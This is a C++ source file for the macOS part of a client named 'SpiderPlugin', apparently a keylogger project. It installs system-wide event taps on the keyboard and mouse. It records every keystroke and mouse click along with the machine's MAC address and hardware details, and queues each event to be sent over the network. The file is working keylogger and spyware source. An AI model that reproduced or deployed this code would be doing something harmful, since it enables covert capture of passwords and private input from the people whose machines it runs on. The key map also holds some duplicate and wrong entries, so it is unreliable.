#if defined __APPLE__

#include "SpiderPlugin.h"
#include "MacAddr.h"
#include <sys/types.h>
#include <sys/sysctl.h>

namespace spider
{
  namespace client
  {
    namespace library
    {
      std::map<std::uint32_t, KeyboardKey> SpiderPlugin::m_osxKeyboardMap = {
        {0x33, KeyboardKey::KB_BACKSPACE}, //
        {0x30, KeyboardKey::KB_TAB},
        {0x24, KeyboardKey::KB_ENTER},
        {0x39, KeyboardKey::KB_CAPSLOCK},
        {0x35, KeyboardKey::KB_ESCAPE},
        {0x31, KeyboardKey::KB_SPACE},//
        {0x74, KeyboardKey::KB_PAGEUP},
        {0x79, KeyboardKey::KB_PAGEDOWN},
        {0x77, KeyboardKey::KB_END},
        {0x73, KeyboardKey::KB_HOME},
        {0x78, KeyboardKey::KB_ARROW_LEFT},//
        {0x7E, KeyboardKey::KB_ARROW_UP},//
        {0x7C, KeyboardKey::KB_ARROW_RIGHT},//
        {0x7D, KeyboardKey::KB_ARROW_DOWN},//
        {0x77, KeyboardKey::KB_DELETE},//
        {0x1D, KeyboardKey::KB_0},
        {0x12, KeyboardKey::KB_1},
        {0x13, KeyboardKey::KB_2},
        {0x14, KeyboardKey::KB_3},
        {0x15, KeyboardKey::KB_4},
        {0x17, KeyboardKey::KB_5},
        {0x16, KeyboardKey::KB_6},
        {0x1A, KeyboardKey::KB_7},
        {0x1C, KeyboardKey::KB_8},
        {0x19, KeyboardKey::KB_9},
        {0x00, KeyboardKey::KB_A},
        {0x0B, KeyboardKey::KB_B},
        {0x08, KeyboardKey::KB_C},
        {0x02, KeyboardKey::KB_D},
        {0x0E, KeyboardKey::KB_E},
        {0x03, KeyboardKey::KB_F},
        {0x05, KeyboardKey::KB_G},
        {0x04, KeyboardKey::KB_H},
        {0x22, KeyboardKey::KB_I},
        {0x26, KeyboardKey::KB_J},
        {0x28, KeyboardKey::KB_K},
        {0x25, KeyboardKey::KB_L},
        {0x2E, KeyboardKey::KB_M},
        {0x2D, KeyboardKey::KB_N},
        {0x1F, KeyboardKey::KB_O},
        {0x23, KeyboardKey::KB_P},
        {0x0C, KeyboardKey::KB_Q},
        {0x0F, KeyboardKey::KB_R},
        {0x01, KeyboardKey::KB_S},
        {0x11, KeyboardKey::KB_T},
        {0x20, KeyboardKey::KB_U},
        {0x09, KeyboardKey::KB_V},
        {0x0D, KeyboardKey::KB_W},
        {0x07, KeyboardKey::KB_X},
        {0x10, KeyboardKey::KB_Y},
        {0x06, KeyboardKey::KB_Z},
        // {VK_LWIN, KeyboardKey::KB_LCMD},
        // {VK_RWIN, KeyboardKey::KB_RCMD},
        // {VK_NUMPAD0, KeyboardKey::KB_0},
        // {VK_NUMPAD1, KeyboardKey::KB_1},
        // {VK_NUMPAD2, KeyboardKey::KB_2},
        // {VK_NUMPAD3, KeyboardKey::KB_3},
        // {VK_NUMPAD4, KeyboardKey::KB_4},
        // {VK_NUMPAD5, KeyboardKey::KB_5},
        // {VK_NUMPAD6, KeyboardKey::KB_6},
        // {VK_NUMPAD7, KeyboardKey::KB_7},
        // {VK_NUMPAD8, KeyboardKey::KB_8},
        // {VK_NUMPAD9, KeyboardKey::KB_9},
        {0x43, KeyboardKey::KB_ASTERISK},
        // {VK_ADD, KeyboardKey::KB_PLUS},
        // {VK_SUBTRACT, KeyboardKey::KB_MINUS},
        // {VK_DIVIDE, KeyboardKey::KB_SLASH},
        {0x7A, KeyboardKey::KB_FN1},
        {0x78, KeyboardKey::KB_FN2},
        {0x63, KeyboardKey::KB_FN3},
        {0x76, KeyboardKey::KB_FN4},
        {0x60, KeyboardKey::KB_FN5},
        {0x61, KeyboardKey::KB_FN6},
        {0x62, KeyboardKey::KB_FN7},
        {0x64, KeyboardKey::KB_FN8},
        {0x65, KeyboardKey::KB_FN9},
        {0x6D, KeyboardKey::KB_FN10},
        {0x67, KeyboardKey::KB_FN11},
        {0x6F, KeyboardKey::KB_FN12},
        // {VK_F13, KeyboardKey::KB_FN13},
        // {VK_F14, KeyboardKey::KB_FN14},
        // {VK_F15, KeyboardKey::KB_FN15},
        // {VK_F16, KeyboardKey::KB_FN16},
        // {VK_F17, KeyboardKey::KB_FN17},
        // {VK_F18, KeyboardKey::KB_FN18},
        // {VK_F19, KeyboardKey::KB_FN19},
        // {VK_F20, KeyboardKey::KB_FN20},
        // {VK_F21, KeyboardKey::KB_FN21},
        // {VK_F22, KeyboardKey::KB_FN22},
        // {VK_F23, KeyboardKey::KB_FN23},
        // {VK_F24, KeyboardKey::KB_FN24},
        // {VK_NUMLOCK, KeyboardKey::KB_NUMLOCK},
        // {VK_SCROLL, KeyboardKey::KB_SCROLL},
        {0x38, KeyboardKey::KB_LSHIFT},
        {0x3C, KeyboardKey::KB_RSHIFT},
        {0x3B, KeyboardKey::KB_LCTRL},
        {0x3E, KeyboardKey::KB_RCTRL},
        {0x29, KeyboardKey::KB_SEMICOLON}, // : if shift
        // {VK_OEM_PLUS, KeyboardKey::KB_PLUS},
        {0x2B, KeyboardKey::KB_COMMA} // < if shift
        // {VK_OEM_MINUS, KeyboardKey::KB_MINUS},// _ if shift
        // {VK_OEM_PERIOD, KeyboardKey::KB_DOT}, // > if shift
        // {VK_OEM, KeyboardKey::KB_SLASH},  // ? if shift
        // {VK_OEM_3, KeyboardKey::KB_BACKQUOTE},// ~ if shift
        // {VK_OEM_4, KeyboardKey::KB_LEFTBRACKET},  // { if shift
        // {VK_OEM_5, KeyboardKey::KB_BACKSLASH},// | if shift
        // {VK_OEM_6, KeyboardKey::KB_RIGHTBRACKET}, // } if shift
        // {VK_OEM_7, KeyboardKey::KB_SIMPLEQUOTE}   // " if shift
      };
      bool SpiderPlugin::initOSX()
      {
        // Get informations
        getInfosOSX();
        MacAddress::get(m_macAddr);
        return true;
      }

      bool SpiderPlugin::deinitOSX()
      {
        return false;
      }

      std::uint64_t SpiderPlugin::getRAMOSX() const
      {
        std::int32_t  mib[2] = {CTL_HW, HW_MEMSIZE};
        std::uint64_t value = 0;
        size_t        length = sizeof(value);

        if (sysctl(mib, 2, &value, &length, nullptr, 0) == -1)
        {
          return 0;
        }
        return value / (1024ull * 1024ull);
      }

      void SpiderPlugin::getInfosOSX()
      {
        m_infos.pArch = ProcArchitecture::AMD64; // Assume x86_64
        m_infos.arch = Architecture::BITS_64;
        m_infos.os = OperatingSystem::MacOS;
        m_infos.pageSize = getPageSize();
        m_infos.ram = getRAMOSX();
        m_infos.nbProc = getNumberProcessors();
      }

      bool SpiderPlugin::hookKeyboardOSX()
      {
        m_osxKeyboardThread = std::thread([&]
            {
            m_osxKeyboardLoop = CFRunLoopGetCurrent();
            keyboardThread();
            });
        return true;
      }

      bool SpiderPlugin::unHookKeyboardOSX()
      {
        CFRunLoopStop(m_osxKeyboardLoop);
        if (m_osxKeyboardThread.joinable())
        {
          m_osxKeyboardThread.join();
        }
        return false;
      }

      bool SpiderPlugin::hookMouseOSX()
      {
        m_osxMouseThread = std::thread([&]
            {
            m_osxMouseLoop = CFRunLoopGetCurrent();
            mouseThread();
            });
        return true;
      }

      bool SpiderPlugin::unHookMouseOSX()
      {
        CFRunLoopStop(m_osxMouseLoop);
        if (m_osxMouseThread.joinable())
        {
          m_osxMouseThread.join();
        }
        return false;
      }

      CGEventRef SpiderPlugin::treatMouseEvent(CGEventTapProxy, CGEventType type,
          CGEventRef eventRef, void *)
      {
        bool getPos = false;
        spider::client::SystemMsg msg;
        msg.sys.type = spider::client::SystemMsgType::EventMouse;
        msg.sys.time = static_cast<std::uint64_t>(std::time(nullptr));
        msg.sys.event.upper = 0;
        std::copy(m_macAddr.begin(), m_macAddr.end(), msg.sys.mac.data());
#if defined __clang__
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wswitch-enum"
#endif
        switch(type)
        {
          case kCGEventLeftMouseUp:
            {
              getPos = true;
              msg.sys.event.key =
                static_cast<std::uint32_t>(MouseButton::ButtonLeft);
              msg.sys.event.state = SystemMsgEventState::Up;
            }
            break;
          case kCGEventLeftMouseDown:
            {
              getPos = true;
              msg.sys.event.key =
                static_cast<std::uint32_t>(MouseButton::ButtonLeft);
              msg.sys.event.state = SystemMsgEventState::Down;
            }
            break;
          case kCGEventRightMouseUp:
            {
              getPos = true;
              msg.sys.event.key =
                static_cast<std::uint32_t>(MouseButton::ButtonRight);
              msg.sys.event.state = SystemMsgEventState::Up;
            }
            break;
          case kCGEventRightMouseDown:
            {
              getPos = true;
              msg.sys.event.key =
                static_cast<std::uint32_t>(MouseButton::ButtonRight);
              msg.sys.event.state = SystemMsgEventState::Down;
            }
            break;
          default:
            break;
        }
#if defined __clang__
#pragma clang diagnostic pop
#endif
        if (getPos)
        {
          CGPoint eventPoint = CGEventGetLocation(eventRef);
          msg.sys.event.posX = static_cast<std::uint32_t>(eventPoint.x);
          msg.sys.event.posY = static_cast<std::uint32_t>(eventPoint.y);
          SpiderPlugin::m_sendToNetwork->push(msg);
        }

        return (eventRef);
      }

      void SpiderPlugin::mouseThread()
      {
        CGEventFlags flags = CGEventSourceFlagsState(kCGEventSourceStateCombinedSessionState);
        CGEventMask mask = CGEventMaskBit(kCGEventMouseMoved) | CGEventMaskBit(kCGEventLeftMouseUp) |
          CGEventMaskBit(kCGEventLeftMouseUp) | CGEventMaskBit(kCGEventRightMouseDown) | CGEventMaskBit(kCGEventRightMouseUp);
        CFMachPortRef tap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, kCGEventTapOptionListenOnly, mask, &SpiderPlugin::treatMouseEvent, &flags);
        if (!tap)
        {
          return ;
        }
        CFRunLoopSourceRef runloop = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, tap, 0);
        m_osxMouseLoop = CFRunLoopGetCurrent();
        CFRunLoopAddSource(CFRunLoopGetCurrent(), runloop, kCFRunLoopCommonModes);
        CGEventTapEnable(tap, true);
        CFRunLoopRun();
      }

      CGEventRef SpiderPlugin::treatKeyboardEvent(CGEventTapProxy, CGEventType type,
          CGEventRef eventRef, void *)
      {
        CGKeyCode virtualKey = static_cast<CGKeyCode>(CGEventGetIntegerValueField(eventRef, kCGKeyboardEventKeycode));
        spider::client::SystemMsg msg;
        msg.sys.type = spider::client::SystemMsgType::EventKeyboard;
        msg.sys.time = static_cast<std::uint64_t>(std::time(nullptr));
        std::copy(m_macAddr.begin(), m_macAddr.end(), msg.sys.mac.data());
        msg.sys.event.key = static_cast<std::uint32_t>(KeyboardKey::KB_NONE);
        if (m_osxKeyboardMap.find(virtualKey) !=
            m_osxKeyboardMap.end())
        {
          msg.sys.event.key =
            static_cast<std::uint32_t>(m_osxKeyboardMap[virtualKey]);
        }
#if defined __clang__
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wswitch-enum"
#endif
        switch (type)
        {
          case kCGEventKeyDown:
            msg.sys.event.state = SystemMsgEventState::Down;
            break;
          case kCGEventKeyUp:
            msg.sys.event.state = SystemMsgEventState::Up;
            break;
          default:
            break;
        }
#if defined __clang__
#pragma clang diagnostic pop
#endif
        SpiderPlugin::m_sendToNetwork->push(msg);
        return (eventRef);
      }

      void SpiderPlugin::keyboardThread()
      {
        CGEventFlags flags = CGEventSourceFlagsState(kCGEventSourceStateCombinedSessionState);
        CGEventMask mask = CGEventMaskBit(kCGEventKeyUp) | CGEventMaskBit(kCGEventKeyDown);
        CFMachPortRef tap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, kCGEventTapOptionListenOnly, mask, &SpiderPlugin::treatKeyboardEvent, &flags);
        if (!tap)
        {
          return ;
        }
        CFRunLoopSourceRef runloop = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, tap, 0);
        m_osxKeyboardLoop = CFRunLoopGetCurrent();
        //CFRunLoopRef baseloop = CFRunLoopGetCurrent();
        CFRunLoopAddSource(CFRunLoopGetCurrent(), runloop, kCFRunLoopCommonModes);
        CGEventTapEnable(tap, true);
        CFRunLoopRun();
      }

      void SpiderPlugin::runOSX() const
      {
      }
    }
  }
}
#endif
